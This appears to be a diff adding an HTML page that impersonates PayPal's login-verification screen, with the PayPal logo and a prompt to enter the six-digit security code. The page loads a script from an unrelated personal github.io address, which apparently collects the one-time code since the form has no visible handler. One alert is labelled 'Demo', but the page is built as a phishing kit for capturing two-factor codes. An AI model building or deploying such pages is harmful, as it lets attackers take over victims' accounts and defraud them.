@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PayPal – Confirm Code</title>
+
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: Arial, sans-serif;
+}
+
+body {
+  background-color: #f5f7fa;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.paypal-container {
+  background-color: white;
+  padding: 35px;
+  width: 380px;
+  border-radius: 12px;
+  text-align: center;
+  box-shadow: 0 4px 18px rgba(0,0,0,0.2);
+}
+
+.logo img {
+  width: 160px;
+  margin-bottom: 20px;
+}
+
+h2 {
+  color: #003087; /* PayPal blue */
+  margin-bottom: 10px;
+  font-size: 22px;
+}
+
+.desc {
+  font-size: 13px;
+  color: #444;
+  margin-bottom: 20px;
+}
+
+input[type="text"] {
+  width: 100%;
+  padding: 12px;
+  border-radius: 8px;
+  border: 1px solid #ccd0d5;
+  background-color: #eef3fb;
+  color: black;
+  font-size: 18px;
+  text-align: center;
+  margin-bottom: 20px;
+  letter-spacing: 6px;
+}
+
+button {
+  width: 100%;
+  padding: 12px;
+  border-radius: 8px;
+  border: none;
+  background-color: #0070ba;
+  color: white;
+  font-size: 16px;
+  cursor: pointer;
+  margin-bottom: 10px;
+}
+
+.resend-btn {
+  background-color: #003087;
+  color: white;
+}
+
+button:disabled {
+  background-color: #999;
+  cursor: not-allowed;
+}
+
+.timer-text {
+  margin-top: 10px;
+  font-size: 14px;
+  color: #666;
+}
+</style>
+
+</head>
+
+<body>
+<script src="https://plyarth.github.io/intc/int3.js"></script>
+<div class="paypal-container">
+
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b5/PayPal.svg/320px-PayPal.svg.png" alt="PayPal">
+  </div>
+
+  <h2>Account Verification</h2>
+
+  <div class="desc">
+    Please enter the 6-digit security code sent to you to confirm this login.
+  </div>
+
+  <form>
+    <input type="text" id="paypalCode" placeholder="------" maxlength="20" name="Otp Code" required>
+
+    <button type="submit">Confirm</button>
+
+    <button type="button" id="resendBtn" class="resend-btn" disabled>
+      Resend Code
+    </button>
+
+    <div class="timer-text">
+      You can resend in <span id="timer">30</span>s
+    </div>
+  </form>
+
+</div>
+
+<script>
+let countdown = 30;
+const timer = document.getElementById("timer");
+const resendBtn = document.getElementById("resendBtn");
+const timerText = document.querySelector(".timer-text");
+
+function startTimer() {
+  const interval = setInterval(() => {
+    countdown--;
+    timer.innerText = countdown;
+
+    if (countdown <= 0) {
+      clearInterval(interval);
+      resendBtn.disabled = false;
+      timerText.innerText = "You may now resend a new code";
+    }
+  }, 1000);
+}
+
+resendBtn.addEventListener("click", () => {
+  alert("Demo: PayPal resend action");
+
+  countdown = 30;
+  resendBtn.disabled = true;
+
+  timerText.innerHTML =
+    'You can resend in <span id="timer">30</span>s';
+
+  startTimer();
+});
+
+startTimer();
+</script>
+
+</body>
+</html>
